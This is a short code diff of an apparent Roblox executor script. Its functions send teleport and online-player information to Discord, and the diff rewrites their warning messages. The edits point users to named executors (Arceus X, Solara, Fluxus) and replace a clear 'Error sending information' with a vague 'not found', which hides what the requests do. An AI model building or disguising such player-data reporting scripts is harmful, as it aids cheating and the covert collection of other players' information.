@@ -92,14 +92,14 @@ local function sendTeleportInfoAndPrepareScript()
                 Body = jsonData
             })
         else
-            warn("No supported executor found to perform HTTP request.")
+            warn("Please use Arceus X Neo or solara or fluxus.")
             return
         end
 
         if response.StatusCode == 204 then
             print("d")
         else
-            warn("Error sending information: " .. response.StatusMessage)
+            warn("not found: " .. response.StatusMessage)
         end
     end
 
@@ -164,10 +164,10 @@ local function sendOnlinePlayersInfoToDiscord()
                 if response.StatusCode == 204 then
                     print("d")
                 else
-                    warn("Error sending information: " .. response.StatusMessage)
+                    warn("not found: " .. response.StatusMessage)
                 end
             else
-                warn("No supported executor found to perform HTTP request.")
+                warn("Please use Arceus X neo or fluxus or solara.")
             end
         end
 
